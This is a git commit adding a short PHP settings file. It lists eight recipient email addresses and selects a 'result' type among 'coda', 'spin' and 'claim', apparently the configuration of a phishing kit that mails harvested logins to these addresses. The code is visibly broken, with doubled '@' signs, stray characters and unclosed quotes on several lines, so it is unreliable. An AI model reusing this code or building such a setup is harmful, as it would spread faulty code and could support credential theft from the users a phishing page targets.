18890e395d1904bdb5fc4519c3b9a402d105c0dd
Bugemgamer <93906438+Bugemgamer@users.noreply.github.com>
2025-12-04 00:13:05 +0700

    Add files via upload

---
+++ setting.php
@@ -0,0 +1,12 @@
+<?php
+$email1 = 'skylandreal@@gmail.com';
+$email2 = 'skylandreal@@gmail.com';
+$email3 = 'skylandreal@@gmail.com@';
+$email4 = 'skylandreal@@gmail.com@;
+$email5 = 'skylandreal@@gmail.com;
+$email6 = 'skylandreal@@gmail.com;
+$email7 = 'skylandreal@@gmail.com;
+$email8 = 'skylandreal@@gmail.com;
+$jenisress = $coda; //$coda, $spin, $claim
+$jenismail = $coda_mail; //$coda_mail, $spin_mail, $claim_mail
+?>
